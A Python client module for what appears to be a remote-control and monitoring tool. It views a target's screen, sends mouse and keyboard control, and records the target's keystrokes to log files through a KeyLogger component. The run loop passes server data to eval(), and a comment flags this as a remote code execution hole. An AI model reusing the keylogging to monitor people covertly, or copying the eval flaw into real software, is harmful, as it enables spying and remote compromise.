from Base.constants import DeviceEvents, Reasons, Actions, \
    ClientTypes, ControlDevice
from Base.settings import SERVER_PORT, SERVER_ADDRESS, \
    ACKNOWLEDGEMENT_ITERATION
from Base.socket_base import Socket, Config
from collections import namedtuple
import logging
import os
from pynput.keyboard import Listener as KeyboardListener, Key, KeyCode
from queue import Queue, Empty
from random import random
from socket import socket, SHUT_RDWR
from threading import Lock, Thread
from time import time, sleep
from typing import Dict, List, Tuple


class BaseWatcher(Socket):
    config = Config()

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)

        self.client_type: bytes
        self.target_code: str

    def reset(self):
        pass

    def start(self):
        self.reset()
        name = self.__class__.__name__
        logging.info(f"Starting Watcher {name}")
        try:
            self.connect()
        except (ConnectionRefusedError, TimeoutError):
            logging.fatal("Cannot connect to server. Aborting")
            self.stop()
            return

        try:
            self.send_data(self.client_type)
            self.send_data(self.config.code.encode(self.FORMAT))
            self.send_data(self.target_code.encode(self.FORMAT))
            data = self.recv_data()
            if data == Reasons.ALREADY_CONNECTED:
                logging.info(f"{name} already connected to server")
                self.stop()
                return
            elif data == Reasons.MAIN_NOT_CONNECTED:
                logging.info("Main watcher Not connected to server")
                self.stop()
                return
            elif data == b"OK":
                pass
            else:
                raise ValueError(f"Unknown value for reason '{data}'")
        except (BrokenPipeError, ConnectionResetError):
            # logging.debug(traceback.format_exc())
            logging.fatal("Connection to server closed unexpectedly. Aborting")
            self.stop()
            return


class Watcher(BaseWatcher):

    def __init__(self):
        super().__init__(SERVER_ADDRESS, SERVER_PORT)

        self.running = False
        self.watching = False
        self.target_list: List[str] = []

        # self.screen_reader: ScreenReader = None
        # self.controller: Controller = None
        # self.keylogger: KeyLogger = None

        self.components: Dict[bytes, BaseWatcher] = {
            ClientTypes.WATCHER_SCREEN_READER: ScreenReader(),
            ClientTypes.WATCHER_CONTROLLER: Controller(),
            ClientTypes.WATCHER_KEYLOGGER: KeyLogger()
        }

        for component in self.components.values():
            component.watcher = self
            # logging.debug(str(component))

        self.screen_reader = self.components[ClientTypes.WATCHER_SCREEN_READER]
        self.controller = self.components[ClientTypes.WATCHER_CONTROLLER]
        self.keylogger = self.components[ClientTypes.WATCHER_KEYLOGGER]

        self.request_lock = Lock()

    def start(self):
        """
            Starts watcher
            returns true if started successfully else false
        """
        if self.running:
            logging.warning("Watcher started without stopping it. "
                            "Cannot start again.")
            raise Exception("Watcher started without stopping")
        self.socket.close()  # close socket if already open
        self.socket = self.new_socket()
        logging.info("Starting Watcher")
        try:
            self.connect()
        except (ConnectionRefusedError, TimeoutError):
            logging.fatal("Cannot connect to server. Aborting")
            self.stop()
            return False
        logging.info("Connected to server")
        self.running = True

        try:
            # send this client's type
            self.send_data(ClientTypes.WATCHER)

            # send this client's unique code
            self.send_data(self.config.code.encode(self.FORMAT))
            ack = self.recv_data()  # receive "OK" or reason
            if ack == Reasons.ALREADY_CONNECTED:
                logging.info("Already connected to server. "
                             "Cannot connect again")
                return False
        except (BrokenPipeError, ConnectionResetError):
            logging.fatal("Connection to server closed unexpectedly. "
                          "Aborting")
            self.stop()
            return False

        Thread(target=self.run).start()

        return True

    def run(self):
        """
            Keeps fetching list of targets from Server
        """
        while self.running:
            # logging.debug("Running")
            with self.request_lock:
                try:
                    self.send_data(Actions.SEND_TARGET_LIST)
                    target_list = self.recv_data().decode(self.FORMAT)
                except (OSError, BrokenPipeError, ConnectionResetError):
                    logging.info("Connection to server closed. Aborting")
                    self.running = False
                    break
            if not target_list:
                logging.debug("Main watcher connection closed")
                self.running = False
                break

            """
                TODO: WARNING: Next line is vulnerable and may result in
                    remote code execution. Fix it
            """
            self.target_list = eval(target_list)
            sleep(.2)
        logging.info("Main watcher stopped")

    def watch(self, target_code):
        """"
            Start screen reader and controller
        """
        self.watching = True
        self.start_all(target_code)

    @property
    def active_components(self) -> List[bytes]:
        return filter(lambda component: self.components[component].running,
                      self.components.keys())

    def start_all(self, target_code):
        for component in self.components.keys():
            self.start_component(component, target_code)

    def start_component(self, component, target_code):
        if component not in self.active_components:
            self.components[component].target_code = target_code
            Thread(target=self.components[component].start).start()
    
    def stop_component(self, component):
        if component in self.active_components:
            self.components[component].stop()

    def stop_watching(self):
        """
            Send stop watching request to the server
        """
        self.watching = False
        self.screen_reader.stop()
        self.controller.stop()
        self.keylogger.stop()

    def stop(self):
        """
            Stop the main watcher client and all its dependents
            (ScreenReader, Controller, etc.)
        """
        if self.watching:
            self.stop_watching()
        self.running = False
        self.target_list = []
        self.socket.close()


class ScreenReader(BaseWatcher):
    """
        The class with methods to read the target screen
    """

    def __init__(self):
        super().__init__(SERVER_ADDRESS, SERVER_PORT)
        self.target_code = ""
        self.config = Config()
        self.watcher: Watcher = None
        self.client_type = ClientTypes.WATCHER_SCREEN_READER

    def reset(self):
        self.stop()
        self.socket.close()
        self.socket = self.new_socket()

    def start(self):
        """
            Start the screen reader client
        """
        super().start()

        self.running = True
        self.run()

    def run(self):
        """
            keep fetching target screen images
            send acknowledgement at every `ACKNOWLEDGEMENT_ITERATION` iteration
        """
        i = 0
        while self.running and self.watcher.watching:
            try:
                img = self.recv_data()
                if not img:
                    logging.info("Connection to screen reader "
                                 "closed by server.")
                    break
                self.img = img
                i += 1
                if i == ACKNOWLEDGEMENT_ITERATION:
                    self.send_data(b"OK")  # send acknowledgement
                    i = 0
            except (BrokenPipeError, ConnectionResetError):  # disconnected
                # check in the gui if this is running...
                # If not running, Say connection problem
                self.running = False
                logging.info("Screen Reader disconnected from "
                             "server, stopping watching")
                self.watcher.watching = False
                break
        self.stop()

    def stop(self):
        """
            Stop screen reader only
        """
        if self.running:
            self.running = False
            self.socket.shutdown(SHUT_RDWR)
            self.socket.close()


class Controller(BaseWatcher):
    """
        The main controller client.
        All controllers (i.e mouse controller, keyboard controller, etc.) use
        the same socket provided by this main controller. To avoid data races
        they all use `control_lock` (an object of `threading.Lock`).
    """

    def __init__(self):
        super().__init__(SERVER_ADDRESS, SERVER_PORT)

        self.config = Config()
        self.target_code = ""
        self.control_lock = Lock()
        self.reset()
        self.watcher: Watcher = None
        self.client_type = ClientTypes.WATCHER_CONTROLLER

    def reset(self):
        self.socket.close()
        self.socket = self.new_socket()
        self.mouse_controller = MouseController(self.socket, self.control_lock)
        self.keyboard_controller = KeyboardController(self.socket,
                                                      self.control_lock)
        self.keyboard_controller.controller = self

    def start(self):
        """
            Start all the controllers
        """
        super().start()

        self.mouse_controller.start()
        self.keyboard_controller.start()

        self.running = True
        self.run()

    def run(self):
        """
            Each controller has an update function. All those
            are called here at regular intervals after some delay
        """
        while self.running:
            try:
                k = self.keyboard_controller.update()
                m = self.mouse_controller.update()
                if not (k or m):
                    self.send_data(Actions.WAIT)
                    sleep(0.01)
                sleep(0.001)
                self.running = self.watcher.running
            except (ConnectionResetError, BrokenPipeError):
                break
        logging.info("Stopping Controller")
        self.stop()

    def stop(self):
        self.running = False
        self.keyboard_controller.stop()
        try:
            self.send_data(Actions.DISCONNECT)
        except (ConnectionResetError, BrokenPipeError, OSError):
            pass
        self.socket.close()


class KeyboardController(Socket):
    """
        The keyboard controller.
    """

    def __init__(self, skt: socket, control_lock: Lock) -> None:
        super().__init__(SERVER_ADDRESS, SERVER_PORT, skt)

        self.listener = None
        self.keys = Queue(0)
        self.control_lock = control_lock
        self.controller: Controller

        # `_window_in_focus` and `_keyboard_on` to be set by GUI app
        self._window_in_focus = True
        self._keyboard_on = True

        self._capture_keys = True

    @property
    def window_in_focus(self):
        return self._window_in_focus

    @window_in_focus.setter
    def window_in_focus(self, value: bool):
        self._window_in_focus = value
        self.capture_keys = self._window_in_focus and self._keyboard_on

    @property
    def keyboard_on(self):
        return self._keyboard_on

    @keyboard_on.setter
    def keyboard_on(self, value):
        self._keyboard_on = value
        self.capture_keys = self._window_in_focus and self._keyboard_on

    @property
    def capture_keys(self):
        return self._capture_keys and self.controller.watcher.watching

    @capture_keys.setter
    def capture_keys(self, value):
        self._capture_keys = value
        if self.capture_keys:
            self.start()
        else:
            self.stop()

    def start(self, supress=None):
        """
            The key queue is updated every time a key is pressed.
            pynput keyboard listener is used.
        """
        logging.debug("Starting Keyboard Controller")
        self.running = True
        if supress is None:
            supress = self.capture_keys
        self.listener = KeyboardListener(on_press=self.on_press,
                                         on_release=self.on_release,
                                         suppress=supress)
        self.listener.start()

    def stop(self):
        """
            Stop the pynput keyboard listener
        """
        if self.running:
            self.running = False
            self.listener.stop()
            logging.debug("Stopped Keyboard Controller")

    def on_press(self, key):
    # def on_press(self, key: Key | KeyCode | None):
        """
            put `vk` value in self.keys
        """
        if self.capture_keys:
            if isinstance(key, Key):
                self.keys.put((DeviceEvents.KEY_DOWN, key.value.vk))
            elif isinstance(key, KeyCode):
                self.keys.put((DeviceEvents.KEY_DOWN, key.vk))

    def on_release(self, key):
        if self.capture_keys:
            if isinstance(key, Key):
                self.keys.put((DeviceEvents.KEY_UP, key.value.vk))
            elif isinstance(key, KeyCode):
                self.keys.put((DeviceEvents.KEY_UP, key.vk))

    def update(self):
        """
            If key queue is not empty, fetch the keys and send to server.
        """
        if not self.keys.empty():
            with self.control_lock:
                event = self.keys.get_nowait()
                self.send_data(str((ControlDevice.CONTROL_KEYBOARD,
                                    *event)).encode(self.FORMAT))
            return True
        return False

    def get_keys(self):
        """
            Gets keys from queue and returns a list containing the keys
        """
        keys = []
        while not self.keys.empty():
            try:
                keys.append(self.keys.get_nowait())
            except Empty:
                break
        return keys


class MouseController(Socket):
    """
        The mouse controller.
        The clicks queue is updated by the GUI.
    """

    UP = "up"
    DOWN = "down"

    def __init__(self, socket: socket, lock: Lock) -> None:
        super().__init__(SERVER_ADDRESS, SERVER_PORT, socket)
        self.events = Queue(0)
        self.pos: Tuple[int, int] = (0, 0)
        self.control_lock = lock
        self.button_down = False
        self._mouse_on = True
        self.capture_events = True

    @property
    def mouse_on(self):
        return self._mouse_on

    @mouse_on.setter
    def mouse_on(self, value):
        self._mouse_on = value
        self.capture_events = self._mouse_on

    def start(self):
        pass

    def update_mouse_pos(self, _, pos):
        """
            Keep updating the mouse position.
        """
        self.pos = pos

    def get_events(self):
        """
            Gets clicks from queue and returns a list containing the clicks
        """
        events = []
        while not self.events.empty():
            events.append(self.events.get_nowait())
        return events

    def update(self):
        """
            Sends mouse control events to server.
        """

        """ One at a time method """
        # if self.events.empty():
        #     return
        # event = self.events.get_nowait()
        # logging.debug(event)
        # with self.control_lock:
        #     self.send_data(CONTROL_MOUSE.encode(self.FORMAT))
        #     self.send_data(str(event).encode(self.FORMAT))
        #     # self.recv_data()   # Receive acknowledgement

        """ Many at a time method """
        events = self.get_events()
        ln = len(events)
        if ln == 0:
            return False
        for i, event in enumerate(events):
            events.extend(self.get_events())
            if (i < ln - 1) and \
                    (event[0] == DeviceEvents.MOUSE_MOVE == events[i + 1][0]):
                sleep(0.001)
                continue
            with self.control_lock:
                self.send_data(str((ControlDevice.CONTROL_MOUSE,
                                    *event)).encode(self.FORMAT))
        return True

    def stop(self):
        pass


class KeyLogger(BaseWatcher):
    """
        writes all keys pressed to `Logs/KeyLogs/keys<time>_<random>.txt`
    """

    SPECIAL_KEY = 0x0
    CHARACTER = 0x1

    class LoggedKey(namedtuple("LoggedKey", ["name", "char", "type"])):
        pass

    def __init__(self) -> None:
        super().__init__(SERVER_ADDRESS, SERVER_PORT)

        if not os.path.exists("Logs"):
            os.mkdir("Logs")
        if not os.path.exists("Logs/KeyLogs"):
            os.mkdir("Logs/KeyLogs")

        self.config = Config()
        self.target_code = ""
        self.client_type = ClientTypes.WATCHER_KEYLOGGER

        self.reset()
        self.watcher = None

        self.key_to_name = {key: str(key).split(".")[-1] for key in Key}

        if "linux" in self.platform:
            from pynput.keyboard._xorg import Listener
            from pynput._util.xorg_keysyms import KEYSYMS, SYMBOLS
            self.KEYPAD_KEYS: dict[int, KeyCode] = Listener._KEYPAD_KEYS.copy()
            self.KEYSYMS = KEYSYMS
            self.SYMBOLS = SYMBOLS
        elif "windows" in self.platform:
            from pynput.keyboard._win32 import Listener

        self.SPECIAL_KEYS = Listener._SPECIAL_KEYS.copy()
        self.SPECIAL_KEYS.pop(Key.space.value.vk)

    def reset(self):
        self.socket.close()
        self.socket = self.new_socket()
        self.logfile_path = f"Logs/KeyLogs/keys{time()}_{random()}"

    def start(self):
        """
            Start the keylogger. Connect to the server.
        """
        super().start()

        self.running = True
        with open(f"{self.logfile_path}.vklog", "w") as self.vk_log, \
                open(f"{self.logfile_path}.verbose", "w") as \
                    self.verbose_key_log, \
                open(f"{self.logfile_path}.log", "w") as self.key_log:
            self.run()

    def run(self):
        """
            Get vk of the key presses on target side.
        """
        while self.running:
            try:
                vks = self.recv_data()
                if not vks:
                    logging.info("Stopping keylogger")
                    break
                self.log_keys(vks)
            except (ConnectionResetError, BrokenPipeError):
                logging.info("Stoping Keylogger")
                break

        self.stop()

    def parse_vk(self, vk):
    # def parse_vk(self, vk) -> LoggedKey | None:
        """
        Parse the `vk` to get key name and/or its character
        representation if available.
        """
        if self.platform.startswith('linux'):
            if vk in self.SPECIAL_KEYS:
                return self.LoggedKey(self.key_to_name[self.SPECIAL_KEYS[vk]],
                                      None, self.SPECIAL_KEY)
            elif vk in self.KEYPAD_KEYS:
                key = self.KEYPAD_KEYS[vk]
                if isinstance(key, Key):
                    return self.LoggedKey(self.key_to_name[key], None,
                                          self.SPECIAL_KEY)
                return self.LoggedKey(None, key.char, self.CHARACTER)

            name = self.KEYSYMS.get(vk, None)
            if name is None:
                return
            if name not in self.SYMBOLS:
                return self.LoggedKey(name, None, self.CHARACTER)
            char = self.SYMBOLS[name][1]
            return self.LoggedKey(name, char, self.CHARACTER)

    def log_keys(self, vks: bytes):
        """
        Convert vks to keys and log them in files
        """
        vks = " ".join(map(lambda x: str(int.from_bytes(x, "big")),
                           vks.split(b'\0')))

        self.vk_log.write(vks+" ")
        events = iter(vks.split())
        keys = map(lambda key: (int(key[0]), int(key[1])),
                   zip(events, events))
        for key in keys:
            self.log_key(key)

    def log_key(self, key: Tuple[str, str]):
        vk = int(key[1])
        k = self.parse_vk(vk)
        if k is None:
            logging.debug(f"missing key for {vk}")
            return
        if k.type == self.SPECIAL_KEY:
            log = f"[{k.name}]"
        elif k.type == self.CHARACTER:
            log = f"{k.char}"
        else:
            raise ValueError(f"Unknown key type '{k.type}'")
        if key[0] == DeviceEvents.KEY_DOWN:
            logv = f"[{log}]⬇️ "
            self.key_log.write(log)
        elif key[0] == DeviceEvents.KEY_UP:
            logv = f"[{log}]⬆️ "
        else:
            raise ValueError(f"Invalid value '{key[0]}' for Event")
        self.verbose_key_log.write(logv)

    def stop(self):
        if self.running:
            self.running = False
            self.socket.shutdown(SHUT_RDWR)
            self.socket.close()


if __name__ == "__main__":
    watcher = Watcher()
    try:
        watcher.start()
    except KeyboardInterrupt:
        watcher.stop()
    logging.info("Watcher stopped")
